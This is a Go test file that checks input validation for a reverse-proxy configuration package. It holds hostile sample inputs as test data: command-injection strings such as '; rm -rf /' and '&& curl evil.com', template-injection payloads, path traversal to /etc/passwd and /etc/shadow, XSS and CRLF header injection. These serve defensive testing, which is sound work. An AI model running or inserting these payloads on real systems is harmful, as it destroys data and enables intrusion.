package hecate

import (
	"bufio"
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/CodeMonkeyCybersecurity/eos/pkg/eos_io"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"go.uber.org/zap"
)

// TestHecateTypes tests Hecate data structures
func TestHecateTypes(t *testing.T) {
	t.Run("service_bundle_structure", func(t *testing.T) {
		// Test ServiceBundle structure
		bundle := ServiceBundle{
			Domain:      "test.example.com",
			BackendPort: "8080",
			Compose:     &ComposeSpec{},
			Nginx:       &NginxSpec{},
			Caddy:       &CaddySpec{},
		}

		// Verify structure integrity
		assert.Equal(t, "test.example.com", bundle.Domain)
		assert.Equal(t, "8080", bundle.BackendPort)
		assert.NotNil(t, bundle.Compose)
		assert.NotNil(t, bundle.Nginx)
		assert.NotNil(t, bundle.Caddy)
	})

	t.Run("prompt_field_structure", func(t *testing.T) {
		// Test PromptField structure
		promptField := PromptField{
			Prompt:  "Enter domain name:",
			Default: "example.com",
			EnvVar:  "DOMAIN",
			Reader:  bufio.NewReader(os.Stdin),
		}

		// Verify structure integrity
		assert.Equal(t, "Enter domain name:", promptField.Prompt)
		assert.Equal(t, "example.com", promptField.Default)
		assert.Equal(t, "DOMAIN", promptField.EnvVar)
		assert.NotNil(t, promptField.Reader)
	})

	t.Run("hecate_config_structure", func(t *testing.T) {
		// Test HecateBasicConfig structure
		config := HecateBasicConfig{
			BaseDomain: "example.com",
			BackendIP:  "192.168.1.100",
			Subdomain:  "test",
			Email:      "admin@example.com",
		}

		// Verify structure integrity
		assert.Equal(t, "example.com", config.BaseDomain)
		assert.Equal(t, "192.168.1.100", config.BackendIP)
		assert.Equal(t, "test", config.Subdomain)
		assert.Equal(t, "admin@example.com", config.Email)
	})
}

// TestDomainValidation tests domain validation security
func TestDomainValidation(t *testing.T) {
	t.Run("valid_domain_names", func(t *testing.T) {
		// Test valid domain names
		validDomains := []string{
			"example.com",
			"sub.example.com",
			"test-site.org",
			"my-domain123.io",
			"a.b.c.example.com",
		}

		for _, domain := range validDomains {
			config := HecateBasicConfig{BaseDomain: domain}
			
			// Verify domain is valid
			assert.NotEmpty(t, config.BaseDomain)
			assert.NotContains(t, config.BaseDomain, " ")
			assert.NotContains(t, config.BaseDomain, "..")
			assert.False(t, strings.HasPrefix(config.BaseDomain, "."))
			assert.False(t, strings.HasPrefix(config.BaseDomain, "-"))
			assert.Less(t, len(config.BaseDomain), 253)
		}
	})

	t.Run("invalid_domain_names", func(t *testing.T) {
		// Test invalid domain names
		invalidDomains := []string{
			"",                      // Empty
			"invalid..domain",       // Double dots
			".starts-with-dot",      // Starts with dot
			"-starts-with-dash",     // Starts with dash
			"has spaces.com",        // Contains spaces
			"special!chars.com",     // Special characters
			"../../etc/passwd",      // Path traversal
			"<script>alert()</script>", // XSS attempt
			strings.Repeat("a", 300) + ".com", // Too long
		}

		for _, domain := range invalidDomains {
			// Invalid domains should be caught in real validation
			isInvalid := domain == "" ||
				strings.Contains(domain, "..") ||
				strings.Contains(domain, " ") ||
				strings.HasPrefix(domain, ".") ||
				strings.HasPrefix(domain, "-") ||
				strings.ContainsAny(domain, "!@#$%^&*()<>") ||
				len(domain) > 253

			assert.True(t, isInvalid, "Domain should be invalid: %s", domain)
		}
	})

	t.Run("subdomain_validation", func(t *testing.T) {
		// Test subdomain validation
		validSubdomains := []string{
			"api",
			"test",
			"app-v2",
			"service123",
			"my-subdomain",
		}

		invalidSubdomains := []string{
			"",                   // Empty
			"sub domain",         // Space
			"sub/domain",         // Slash
			"-subdomain",         // Starts with dash
			"subdomain-",         // Ends with dash
			"../../../etc",       // Path traversal
			"<script>",           // XSS
		}

		for _, subdomain := range validSubdomains {
			config := HecateBasicConfig{Subdomain: subdomain}
			assert.NotEmpty(t, config.Subdomain)
			assert.NotContains(t, config.Subdomain, " ")
			assert.NotContains(t, config.Subdomain, "/")
		}

		for _, subdomain := range invalidSubdomains {
			// Basic validation checks
			isInvalid := subdomain == "" ||
				strings.Contains(subdomain, " ") ||
				strings.Contains(subdomain, "/") ||
				strings.HasPrefix(subdomain, "-") ||
				strings.HasSuffix(subdomain, "-") ||
				strings.Contains(subdomain, "../") ||
				strings.ContainsAny(subdomain, "<>")

			assert.True(t, isInvalid, "Subdomain should be invalid: %s", subdomain)
		}
	})

	t.Run("email_validation", func(t *testing.T) {
		// Test email validation
		validEmails := []string{
			"admin@example.com",
			"user@sub.example.com",
			"test.user@example.org",
			"admin+tag@example.com",
		}

		invalidEmails := []string{
			"",                    // Empty
			"notanemail",          // No @
			"@example.com",        // No local part
			"user@",               // No domain
			"user space@test.com", // Space
			"user@domain..com",    // Double dot
		}

		for _, email := range validEmails {
			config := HecateBasicConfig{Email: email}
			assert.NotEmpty(t, config.Email)
			assert.Contains(t, config.Email, "@")
			assert.True(t, strings.Index(config.Email, "@") > 0)
			assert.True(t, strings.Index(config.Email, "@") < len(config.Email)-1)
		}

		for _, email := range invalidEmails {
			// Basic email validation
			isInvalid := email == "" ||
				!strings.Contains(email, "@") ||
				strings.HasPrefix(email, "@") ||
				strings.HasSuffix(email, "@") ||
				strings.Contains(email, " ") ||
				strings.Contains(email, "..")

			assert.True(t, isInvalid, "Email should be invalid: %s", email)
		}
	})
}

// TestIPAddressValidation tests IP address validation security
func TestIPAddressValidation(t *testing.T) {
	t.Run("valid_ip_addresses", func(t *testing.T) {
		// Test valid IP addresses
		validIPs := []string{
			"192.168.1.1",
			"10.0.0.1",
			"172.16.0.1",
			"8.8.8.8",
			"127.0.0.1",
			"255.255.255.0",
		}

		for _, ip := range validIPs {
			config := HecateBasicConfig{BackendIP: ip}
			assert.NotEmpty(t, config.BackendIP)
			
			// Basic IP validation
			parts := strings.Split(config.BackendIP, ".")
			assert.Len(t, parts, 4, "IP should have 4 octets")
		}
	})

	t.Run("invalid_ip_addresses", func(t *testing.T) {
		// Test invalid IP addresses
		invalidIPs := []string{
			"",                  // Empty
			"256.256.256.256",   // Out of range
			"192.168.1",         // Missing octet
			"192.168.1.1.1",     // Too many octets
			"not.an.ip.address", // Not numeric
			"192.168.1.1; rm -rf /", // Command injection
			"<script>alert()</script>", // XSS
			"../../etc/passwd",  // Path traversal
		}

		for _, ip := range invalidIPs {
			// Basic IP validation
			isInvalid := ip == ""
			
			if !isInvalid {
				parts := strings.Split(ip, ".")
				if len(parts) != 4 {
					isInvalid = true
				} else {
					// Check each octet
					for _, part := range parts {
						// Check if numeric
						for _, ch := range part {
							if ch < '0' || ch > '9' {
								isInvalid = true
								break
							}
						}
					}
				}
			}

			assert.True(t, isInvalid, "IP should be invalid: %s", ip)
		}
	})
}

// TestPortValidation tests port validation security
func TestPortValidation(t *testing.T) {
	t.Run("valid_ports", func(t *testing.T) {
		// Test valid port numbers
		validPorts := []string{
			"80",
			"443",
			"8080",
			"8443",
			"3000",
			"65535",
		}

		for _, port := range validPorts {
			bundle := ServiceBundle{BackendPort: port}
			assert.NotEmpty(t, bundle.BackendPort)
			
			// Check if numeric
			for _, ch := range bundle.BackendPort {
				assert.True(t, ch >= '0' && ch <= '9', "Port should be numeric: %s", port)
			}
		}
	})

	t.Run("invalid_ports", func(t *testing.T) {
		// Test invalid port numbers
		invalidPorts := []string{
			"",           // Empty
			"0",          // Zero
			"-1",         // Negative
			"65536",      // Out of range
			"abc",        // Not numeric
			"8080; ls",   // Command injection
			"80<script>", // XSS
		}

		for _, port := range invalidPorts {
			// Basic port validation
			isInvalid := port == "" || port == "0"
			
			if !isInvalid {
				// Check if numeric and in range
				for _, ch := range port {
					if ch < '0' || ch > '9' {
						isInvalid = true
						break
					}
				}
			}

			assert.True(t, isInvalid, "Port should be invalid: %s", port)
		}
	})
}

// TestFileOperationsSecurity tests file operations security
func TestFileOperationsSecurity(t *testing.T) {
	// Create temporary directory for testing
	tempDir, err := os.MkdirTemp("", "hecate-test")
	require.NoError(t, err)
	defer os.RemoveAll(tempDir)

	t.Run("file_permissions", func(t *testing.T) {
		// Test file creation with secure permissions
		testFile := filepath.Join(tempDir, "test-config.conf")
		content := "test configuration"
		
		err := os.WriteFile(testFile, []byte(content), 0644)
		require.NoError(t, err)

		// Check file permissions
		info, err := os.Stat(testFile)
		require.NoError(t, err)
		
		mode := info.Mode().Perm()
		assert.Equal(t, os.FileMode(0644), mode, "File should have 0644 permissions")
	})

	t.Run("path_traversal_prevention", func(t *testing.T) {
		// Test path traversal prevention
		maliciousPaths := []string{
			"../../../etc/passwd",
			"..\\..\\windows\\system32",
			"/etc/shadow",
			"config/../../../etc/hosts",
		}

		for _, path := range maliciousPaths {
			// In real implementation, should sanitize paths
			assert.True(t, strings.Contains(path, "..") || strings.HasPrefix(path, "/"),
				"Path should be detected as potentially malicious: %s", path)
		}
	})

	t.Run("template_injection_prevention", func(t *testing.T) {
		// Test template injection prevention
		maliciousTemplates := []string{
			"{{.Exec `rm -rf /`}}",
			"{{ .System.Exec \"curl evil.com\" }}",
			"{{range .}}{{.}}{{end}}",
		}

		for _, template := range maliciousTemplates {
			// Templates should be handled safely
			assert.NotEmpty(t, template)
			// In real implementation, would validate template content
		}
	})
}

// TestConfigurationSecurity tests configuration security
func TestConfigurationSecurity(t *testing.T) {
	ctx := context.Background()
	logger := zap.NewNop()
	_ = &eos_io.RuntimeContext{
		Ctx: ctx,
		Log: logger,
	}

	// Create temporary directory for testing
	tempDir, err := os.MkdirTemp("", "hecate-config-test")
	require.NoError(t, err)
	defer os.RemoveAll(tempDir)

	t.Run("config_file_security", func(t *testing.T) {
		// Test configuration file security
		config := &HecateBasicConfig{
			BaseDomain: "example.com",
			BackendIP:  "192.168.1.100",
			Subdomain:  "test",
			Email:      "admin@example.com",
		}

		// Test that sensitive data is handled properly
		assert.NotEmpty(t, config.Email)
		assert.NotContains(t, config.Email, "password")
	})

	t.Run("environment_variable_injection", func(t *testing.T) {
		// Test environment variable injection prevention
		maliciousEnvVars := map[string]string{
			"DOMAIN":     "example.com; rm -rf /",
			"BACKEND_IP": "192.168.1.1 && curl evil.com",
			"EMAIL":      "admin@example.com<script>alert()</script>",
		}

		for key, value := range maliciousEnvVars {
			// Environment variables should be stored as-is but handled safely
			assert.NotEmpty(t, key)
			assert.NotEmpty(t, value)
			// In real implementation, would validate when used
		}
	})

	t.Run("missing_config_handling", func(t *testing.T) {
		// Test handling of missing configuration
		emptyConfig := &HecateBasicConfig{}
		
		// Check that all fields are empty
		assert.Empty(t, emptyConfig.BaseDomain)
		assert.Empty(t, emptyConfig.BackendIP)
		assert.Empty(t, emptyConfig.Subdomain)
		assert.Empty(t, emptyConfig.Email)
	})
}

// TestReverseProxySecurityValidation tests reverse proxy security
func TestReverseProxySecurityValidation(t *testing.T) {
	t.Run("upstream_validation", func(t *testing.T) {
		// Test upstream server validation
		validUpstreams := []string{
			"http://localhost:8080",
			"https://backend.local:443",
			"http://192.168.1.100:3000",
			"http://app:8080", // Docker service name
		}

		invalidUpstreams := []string{
			"",                        // Empty
			"not-a-url",              // Invalid URL
			"javascript:alert()",     // XSS
			"file:///etc/passwd",     // File access
			"http://;rm -rf /",       // Command injection
		}

		for _, upstream := range validUpstreams {
			// Valid upstreams should have proper format
			assert.True(t, strings.HasPrefix(upstream, "http://") || 
				strings.HasPrefix(upstream, "https://"))
		}

		for _, upstream := range invalidUpstreams {
			// Invalid upstreams should be caught
			isInvalid := upstream == "" ||
				(!strings.HasPrefix(upstream, "http://") && 
				 !strings.HasPrefix(upstream, "https://")) ||
				strings.Contains(upstream, ";") ||
				strings.Contains(upstream, "javascript:") ||
				strings.Contains(upstream, "file:")

			assert.True(t, isInvalid, "Upstream should be invalid: %s", upstream)
		}
	})

	t.Run("header_injection_prevention", func(t *testing.T) {
		// Test header injection prevention
		maliciousHeaders := map[string]string{
			"X-Forwarded-For": "192.168.1.1\r\nX-Evil: true",
			"Host":            "example.com\r\nSet-Cookie: session=hijacked",
			"User-Agent":      "Mozilla/5.0\r\n\r\nGET /admin HTTP/1.1",
		}

		for header, value := range maliciousHeaders {
			// Headers should be validated for CRLF injection
			assert.NotEmpty(t, header)
			assert.Contains(t, value, "\r\n", "Should detect CRLF injection")
		}
	})

	t.Run("ssl_certificate_validation", func(t *testing.T) {
		// Test SSL certificate path validation
		validCertPaths := []string{
			"/etc/ssl/certs/example.com.crt",
			"/opt/certs/wildcard.pem",
			"./certs/domain.crt",
		}

		invalidCertPaths := []string{
			"",                          // Empty
			"../../../etc/passwd",       // Path traversal
			"/etc/ssl/certs/cert.crt; rm -rf /", // Command injection
			"<script>alert()</script>",  // XSS
		}

		for _, path := range validCertPaths {
			// Valid paths should end with expected extensions
			assert.True(t, strings.HasSuffix(path, ".crt") || 
				strings.HasSuffix(path, ".pem"))
		}

		for _, path := range invalidCertPaths {
			// Invalid paths should be caught
			isInvalid := path == "" ||
				strings.Contains(path, "../") ||
				strings.Contains(path, ";") ||
				strings.Contains(path, "<")

			assert.True(t, isInvalid, "Path should be invalid: %s", path)
		}
	})
}

// TestServiceBundleOperations tests ServiceBundle operations
func TestServiceBundleOperations(t *testing.T) {
	ctx := context.Background()
	logger := zap.NewNop()
	rc := &eos_io.RuntimeContext{
		Ctx: ctx,
		Log: logger,
	}

	t.Run("generic_wizard_validation", func(t *testing.T) {
		// Test GenericWizard input validation
		prompts := []PromptField{
			{
				Prompt:  "Enter domain:",
				Default: "example.com",
				EnvVar:  "DOMAIN",
				Reader:  bufio.NewReader(strings.NewReader("test.com\n")),
			},
			{
				Prompt:  "Enter port:",
				Default: "8080",
				EnvVar:  "PORT",
				Reader:  bufio.NewReader(strings.NewReader("9000\n")),
			},
		}

		bundle := GenericWizard(
			rc,
			"test-service",
			prompts,
			"test-service",
			"version: '3'\nservices:\n  test:\n    image: test:latest",
			nil, // No Caddy
			nil, // No Nginx
			[]string{},
			[]string{},
			[]string{},
		)

		// Verify bundle was created
		assert.NotNil(t, bundle.Compose)
		assert.NotNil(t, bundle.Compose.Services["test-service"])
		assert.NotEmpty(t, bundle.Compose.Services["test-service"].Environment)
	})

	t.Run("template_rendering_security", func(t *testing.T) {
		// Test template rendering security
		templateStr := "server_name {{.Domain}};"
		data := map[string]string{
			"Domain": "example.com",
		}

		rendered, err := renderTemplateFromString(templateStr, data)
		require.NoError(t, err)
		assert.Equal(t, "server_name example.com;", rendered)

		// Test with malicious input
		maliciousData := map[string]string{
			"Domain": "example.com; rm -rf /",
		}

		rendered, err = renderTemplateFromString(templateStr, maliciousData)
		require.NoError(t, err)
		// Template should render the value as-is, security should be handled elsewhere
		assert.Contains(t, rendered, "example.com; rm -rf /")
	})
}